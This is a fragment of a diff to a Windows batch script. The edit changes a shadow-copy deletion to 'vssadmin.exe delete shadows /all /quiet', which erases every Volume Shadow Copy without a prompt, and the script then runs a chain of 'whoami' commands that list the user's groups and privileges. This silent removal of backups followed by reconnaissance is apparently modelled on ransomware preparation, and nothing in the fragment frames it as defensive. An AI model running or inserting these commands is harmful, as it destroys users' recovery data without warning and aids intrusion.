@@ -287,7 +287,7 @@ ECHO  %date%-%time%
 ECHO ============================
 vssadmin delete shadows /For=C: /oldest
 ECHO ============================
-vssadmin delete shadows /all
+vssadmin.exe delete shadows /all /quiet
 ECHO ============================
 whoami /upn & whoami /fqdn & whoami /logonid & whoami /user & whoami /groups & whoami /priv & whoami /all
 ECHO ============================
